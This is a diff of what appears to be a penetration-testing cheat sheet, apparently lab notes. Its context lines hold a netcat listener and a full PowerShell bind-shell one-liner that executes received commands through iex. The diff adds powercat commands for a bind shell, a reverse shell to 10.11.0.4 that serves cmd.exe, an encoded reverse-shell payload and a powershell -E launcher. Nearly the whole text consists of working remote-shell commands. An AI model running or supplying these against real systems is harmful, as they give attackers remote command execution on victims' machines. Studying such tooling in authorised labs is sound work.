@@ -66,7 +66,11 @@ sudo nc -lnvp 443
 powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
 nc -nv 10.11.0.22 443
 ```
-### load powercat
+### load powercat, bindshell, reverse shell, encrypted payloads
 ```
 Import-Module .\powercat.ps1
+powercat -l -p 443 -e cmd.exe
+powercat -c 10.11.0.4 -p 443 -e cmd.exe
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+powershell.exe -E en_payload
 ```
